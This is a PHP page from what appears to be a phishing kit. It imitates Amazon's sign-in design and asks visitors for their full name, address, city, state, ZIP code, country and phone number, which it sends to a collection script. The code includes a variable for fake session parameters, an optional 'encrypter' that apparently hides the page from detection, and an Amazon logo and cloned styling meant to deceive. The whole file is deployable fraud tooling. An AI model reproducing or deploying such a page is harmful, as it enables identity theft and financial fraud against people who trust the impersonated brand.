<?php
error_reporting(0);
@ob_start();
session_start();
if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");
	exit;
}

include_once 'inc/config.php';
include_once 'inc/functions.php';

$_GET = array();
  $params = explode('&', $_SERVER['QUERY_STRING']);
  foreach ($params as $pair) {
    list($key, $value) = explode('=', $pair);
    $_GET[urldecode($key)] = urldecode($value);
}
$session = isset($_GET['session']) ? $_GET['session'] : '';
$fake_session_params = "login.php?auth=1&header=1&session=".$session;

if(!isset($_SESSION['LANG'])) {
	if($dynamic_language) {
		$_SESSION['LANG'] = getBrowserLanguage(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
	} else {
		$_SESSION['LANG'] = $default_language.'.php';
	}
}

require_once 'languages/'.$_SESSION['LANG'];
?>

<?php
if(isset($_GET['error']) && $_GET['error'] === 'true' && isset($_GET['e'])) {
  $s = base64_decode($_GET['e']);
  $errorStatus = array();
  parse_str($s, $errorStatus);
}
?>
<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">



<meta charset="utf-8">
    <title dir="ltr"><?php echo $lang['PAGE_TITLE']; ?></title>
    
      
    
  
<link rel="shortcut icon" href="assets/imgs/favicon.ico">
<link media="all" href="assets/css/style.css" type="text/css" rel="stylesheet">
</head>
<body class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_60000-c a-meter-animate">


<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
        



<div class="a-section a-spacing-medium a-text-center">
  
    
    
      <a class="a-link-nav-icon" tabindex="-1" href="#">

        
        
          
          
            <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>
          
        
        
      </a>
    
  
</div>


      </div>

      <div class="a-section auth-pagelet-container a-spacing-base">
          <?php 
          	if(isset($errorStatus)) {
          			$error_message = '<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">'.$lang['ERROR_MESSAGE_BILLING_TOP'].'</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">';
      				$error_message .=  '<ul class="a-nostyle a-vertical a-spacing-none">';
      				$error_message .=  '<li><span class="a-list-item">';

          		 if(isset($errorStatus['name']) && $errorStatus['name'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_NAME'].'</P>';
              }
              if(isset($errorStatus['address']) && $errorStatus['address'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_ADDRESS'].'</P>';
              }
              if(isset($errorStatus['city']) && $errorStatus['city'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_CITY'].'</P>';
              }
              if(isset($errorStatus['zip']) && $errorStatus['zip'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_ZIP'].'</P>';
              }
              if(isset($errorStatus['country']) && $errorStatus['country'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_COUNTRY'].'</P>';
              }
              if(isset($errorStatus['phone']) && $errorStatus['phone'] === '0') {
                  $error_message .= '<P>'.$lang['INVALID_PHONE'].'</P>';
              } 
      			$error_message .= '</span></li></ul> </div></div></div>';
      			echo $error_message;

          	}
          ?>
        
      </div>

      <div class="a-section">
        


<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section">
    
    <form  method="post" action="check_profile.php?<?php echo $_SESSION['SESSION_ID']; ?>" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
      <div class="a-section">


        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h3 class="a-spacing-small">
            <?php echo $lang['ENTER_YOUR_ADDRESS']; ?>
          </h3>
          
          <div class="a-row a-spacing-base">
            <label for="ap_fullname">
              <?php echo $lang['FULL_NAME']; ?>
            </label>
            <input maxlength="25" name="name" tabindex="1"  class="a-input-text a-span12  auth-autofocus auth-required-field" type="text" value="<?php echo isset($_SESSION['NAME']) ? $_SESSION['NAME'] : ''; ?>" required>
          </div>


 			 <div class="a-row a-spacing-base">
            <label for="ap_address">
              <?php echo $lang['ADDRESS_LINE']; ?>
            </label>
            <input maxlength="100" name="address" tabindex="2"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['ADDRESS']) ? $_SESSION['ADDRESS'] : ''; ?>" required>
          </div>

          	 <div class="a-row a-spacing-base">
            <label for="ap_city">
              <?php echo $lang['CITY']; ?>
            </label>
            <input maxlength="30" name="city" tabindex="3"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['CITY']) ? $_SESSION['CITY'] : ''; ?>" required>
          </div>

        <div class="a-row a-spacing-base">
            <label for="ap_state">
              <?php echo $lang['STATE']; ?>
            </label>
            <input maxlength="50" name="state" tabindex="4"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['STATE']) ? $_SESSION['STATE'] : ''; ?>" required>
          </div>

             <div class="a-row a-spacing-base">
            <label for="ap_zip">
              <?php echo $lang['ZIP']; ?>
            </label>
            <input maxlength="9" name="zip" tabindex="5"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['ZIP']) ? $_SESSION['ZIP'] : ''; ?>" required>
          </div>

             <div class="a-row a-spacing-base">
            <label for="ap_country">
              <?php echo $lang['COUNTRY']; ?>
            </label>
           <select name="country" class="enterAddressFormField" id="countryCode" required>
          <option value="--" selected>--</option>
          <option value="AF">Afghanistan</option>
          <option value="AX">Aland Islands</option>
          <option value="AL">Albania</option>
          <option value="DZ">Algeria</option>
          <option value="AS">American Samoa</option>
          <option value="AD">Andorra</option>
          <option value="AO">Angola</option>
          <option value="AI">Anguilla</option>
          <option value="AQ">Antarctica</option>
          <option value="AG">Antigua and Barbuda</option>
          <option value="AR">Argentina</option>
          <option value="AM">Armenia</option>
          <option value="AW">Aruba</option>
          <option value="AU">Australia</option>
          <option value="AT">Austria</option>
          <option value="AZ">Azerbaijan</option>
          <option value="BS">Bahamas, The</option>
          <option value="BH">Bahrain</option>
          <option value="BD">Bangladesh</option>
          <option value="BB">Barbados</option>
          <option value="BY">Belarus</option>
          <option value="BE">Belgium</option>
          <option value="BZ">Belize</option>
          <option value="BJ">Benin</option>
          <option value="BM">Bermuda</option>
          <option value="BT">Bhutan</option>
          <option value="BO">Bolivia</option>
          <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
          <option value="BA">Bosnia and Herzegovina</option>
          <option value="BW">Botswana</option>
          <option value="BV">Bouvet Island</option>
          <option value="BR">Brazil</option>
          <option value="IO">British Indian Ocean Territory</option>
          <option value="BN">Brunei Darussalam</option>
          <option value="BG">Bulgaria</option>
          <option value="BF">Burkina Faso</option>
          <option value="BI">Burundi</option>
          <option value="KH">Cambodia</option>
          <option value="CM">Cameroon</option>
          <option value="CA">Canada</option>
          <option value="CV">Cape Verde</option>
          <option value="KY">Cayman Islands</option>
          <option value="CF">Central African Republic</option>
          <option value="TD">Chad</option>
          <option value="CL">Chile</option>
          <option value="CN">China</option>
          <option value="CX">Christmas Island</option>
          <option value="CC">Cocos (Keeling) Islands</option>
          <option value="CO">Colombia</option>
          <option value="KM">Comoros</option>
          <option value="CG">Congo</option>
          <option value="CD">Congo, The Democratic Republic of the</option>
          <option value="CK">Cook Islands</option>
          <option value="CR">Costa Rica</option>
          <option value="CI">Cote D'ivoire</option>
          <option value="HR">Croatia</option>
          <option value="CW">Curaçao</option>
          <option value="CY">Cyprus</option>
          <option value="CZ">Czech Republic</option>
          <option value="DK">Denmark</option>
          <option value="DJ">Djibouti</option>
          <option value="DM">Dominica</option>
          <option value="DO">Dominican Republic</option>
          <option value="EC">Ecuador</option>
          <option value="EG">Egypt</option>
          <option value="SV">El Salvador</option>
          <option value="GQ">Equatorial Guinea</option>
          <option value="ER">Eritrea</option>
          <option value="EE">Estonia</option>
          <option value="ET">Ethiopia</option>
          <option value="FK">Falkland Islands (Malvinas)</option>
          <option value="FO">Faroe Islands</option>
          <option value="FJ">Fiji</option>
          <option value="FI">Finland</option>
          <option value="FR">France</option>
          <option value="GF">French Guiana</option>
          <option value="PF">French Polynesia</option>
          <option value="TF">French Southern Territories</option>
          <option value="GA">Gabon</option>
          <option value="GM">Gambia, The</option>
          <option value="GE">Georgia</option>
          <option value="DE">Germany</option>
          <option value="GH">Ghana</option>
          <option value="GI">Gibraltar</option>
          <option value="GR">Greece</option>
          <option value="GL">Greenland</option>
          <option value="GD">Grenada</option>
          <option value="GP">Guadeloupe</option>
          <option value="GU">Guam</option>
          <option value="GT">Guatemala</option>
          <option value="GG">Guernsey</option>
          <option value="GN">Guinea</option>
          <option value="GW">Guinea-Bissau</option>
          <option value="GY">Guyana</option>
          <option value="HT">Haiti</option>
          <option value="HM">Heard Island and the McDonald Islands</option>
          <option value="VA">Holy See</option>
          <option value="HN">Honduras</option>
          <option value="HK">Hong Kong</option>
          <option value="HU">Hungary</option>
          <option value="IS">Iceland</option>
          <option value="IN">India</option>
          <option value="ID">Indonesia</option>
          <option value="IQ">Iraq</option>
          <option value="IE">Ireland</option>
          <option value="IM">Isle of Man</option>
          <option value="IL">Israel</option>
          <option value="IT">Italy</option>
          <option value="JM">Jamaica</option>
          <option value="JP">Japan</option>
          <option value="JE">Jersey</option>
          <option value="JO">Jordan</option>
          <option value="KZ">Kazakhstan</option>
          <option value="KE">Kenya</option>
          <option value="KI">Kiribati</option>
          <option value="KR">Korea, Republic of</option>
          <option value="XK">Kosovo</option>
          <option value="KW">Kuwait</option>
          <option value="KG">Kyrgyzstan</option>
          <option value="LA">Lao People's Democratic Republic</option>
          <option value="LV">Latvia</option>
          <option value="LB">Lebanon</option>
          <option value="LS">Lesotho</option>
          <option value="LR">Liberia</option>
          <option value="LY">Libya</option>
          <option value="LI">Liechtenstein</option>
          <option value="LT">Lithuania</option>
          <option value="LU">Luxembourg</option>
          <option value="MO">Macao</option>
          <option value="MK">Macedonia, The Former Yugoslav Republic of</option>
          <option value="MG">Madagascar</option>
          <option value="MW">Malawi</option>
          <option value="MY">Malaysia</option>
          <option value="MV">Maldives</option>
          <option value="ML">Mali</option>
          <option value="MT">Malta</option>
          <option value="MH">Marshall Islands</option>
          <option value="MQ">Martinique</option>
          <option value="MR">Mauritania</option>
          <option value="MU">Mauritius</option>
          <option value="YT">Mayotte</option>
          <option value="MX">Mexico</option>
          <option value="FM">Micronesia, Federated States of</option>
          <option value="MD">Moldova, Republic of</option>
          <option value="MC">Monaco</option>
          <option value="MN">Mongolia</option>
          <option value="ME">Montenegro</option>
          <option value="MS">Montserrat</option>
          <option value="MA">Morocco</option>
          <option value="MZ">Mozambique</option>
          <option value="MM">Myanmar</option>
          <option value="NA">Namibia</option>
          <option value="NR">Nauru</option>
          <option value="NP">Nepal</option>
          <option value="NL">Netherlands</option>
          <option value="AN">Netherlands Antilles</option>
          <option value="NC">New Caledonia</option>
          <option value="NZ">New Zealand</option>
          <option value="NI">Nicaragua</option>
          <option value="NE">Niger</option>
          <option value="NG">Nigeria</option>
          <option value="NU">Niue</option>
          <option value="NF">Norfolk Island</option>
          <option value="MP">Northern Mariana Islands</option>
          <option value="NO">Norway</option>
          <option value="OM">Oman</option>
          <option value="PK">Pakistan</option>
          <option value="PW">Palau</option>
          <option value="PS">Palestinian Territories</option>
          <option value="PA">Panama</option>
          <option value="PG">Papua New Guinea</option>
          <option value="PY">Paraguay</option>
          <option value="PE">Peru</option>
          <option value="PH">Philippines</option>
          <option value="PN">Pitcairn</option>
          <option value="PL">Poland</option>
          <option value="PT">Portugal</option>
          <option value="PR">Puerto Rico</option>
          <option value="QA">Qatar</option>
          <option value="RE">Reunion</option>
          <option value="RO">Romania</option>
          <option value="RU">Russian Federation</option>
          <option value="RW">Rwanda</option>
          <option value="BL">Saint Barthelemy</option>
          <option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
          <option value="KN">Saint Kitts and Nevis</option>
          <option value="LC">Saint Lucia</option>
          <option value="MF">Saint Martin</option>
          <option value="PM">Saint Pierre and Miquelon</option>
          <option value="VC">Saint Vincent and the Grenadines</option>
          <option value="WS">Samoa</option>
          <option value="SM">San Marino</option>
          <option value="ST">Sao Tome and Principe</option>
          <option value="SA">Saudi Arabia</option>
          <option value="SN">Senegal</option>
          <option value="RS">Serbia</option>
          <option value="SC">Seychelles</option>
          <option value="SL">Sierra Leone</option>
          <option value="SG">Singapore</option>
          <option value="SX">Sint Maarten</option>
          <option value="SK">Slovakia</option>
          <option value="SI">Slovenia</option>
          <option value="SB">Solomon Islands</option>
          <option value="SO">Somalia</option>
          <option value="ZA">South Africa</option>
          <option value="GS">South Georgia and the South Sandwich Islands</option>
          <option value="ES">Spain</option>
          <option value="LK">Sri Lanka</option>
          <option value="SR">Suriname</option>
          <option value="SJ">Svalbard and Jan Mayen</option>
          <option value="SZ">Swaziland</option>
          <option value="SE">Sweden</option>
          <option value="CH">Switzerland</option>
          <option value="TW">Taiwan</option>
          <option value="TJ">Tajikistan</option>
          <option value="TZ">Tanzania, United Republic of</option>
          <option value="TH">Thailand</option>
          <option value="TL">Timor-leste</option>
          <option value="TG">Togo</option>
          <option value="TK">Tokelau</option>
          <option value="TO">Tonga</option>
          <option value="TT">Trinidad and Tobago</option>
          <option value="TN">Tunisia</option>
          <option value="TR">Turkey</option>
          <option value="TM">Turkmenistan</option>
          <option value="TC">Turks and Caicos Islands</option>
          <option value="TV">Tuvalu</option>
          <option value="UG">Uganda</option>
          <option value="UA">Ukraine</option>
          <option value="AE">United Arab Emirates</option>
          <option value="GB">United Kingdom</option>
          <option value="US">United States</option>
          <option value="UM">United States Minor Outlying Islands</option>
          <option value="UY">Uruguay</option>
          <option value="UZ">Uzbekistan</option>
          <option value="VU">Vanuatu</option>
          <option value="VE">Venezuela</option>
          <option value="VN">Vietnam</option>
          <option value="VG">Virgin Islands, British</option>
          <option value="VI">Virgin Islands, U.S.</option>
          <option value="WF">Wallis and Futuna</option>
          <option value="EH">Western Sahara</option>
          <option value="YE">Yemen</option>
          <option value="ZM">Zambia</option>
          <option value="ZW">Zimbabwe</option>
          </select>
          </div>
          <div class="a-row a-spacing-base">
        <label for="ap_phone">
          <?php echo $lang['PHONE']; ?>
        </label>
        <input maxlength="15" name="phone" tabindex="7"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['PHONE']) ? $_SESSION['PHONE'] : ''; ?>" required>
      </div>


          <div class="a-section a-spacing-extra-large">
             
            <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
              <?php echo $lang['BUTTON_CONTINUE']; ?>
            </span></span></span>

          </div>
          
                   
        </div></div>
      </div>
  </div>
</div>


      </div>

      
      <div id="right-2">
      </div>
      
      <div class="a-section a-spacing-top-extra-large">
        


<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['TERMS_OF_USE']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['PRIVACY_POLICY']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  
</div>

<div class="a-section a-spacing-none a-text-center">
  <span class="a-size-mini a-color-secondary">
    <?php echo $lang['COPYRIGHT']; ?>
  </span>
</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

<script type='text/javascript'>
document.getElementById('countryCode').value = "<?php echo isset($_SESSION['COUNTRY']) ? $_SESSION['COUNTRY'] : '--'; ?>";
</script>

<?php ob_end_flush(); ?>
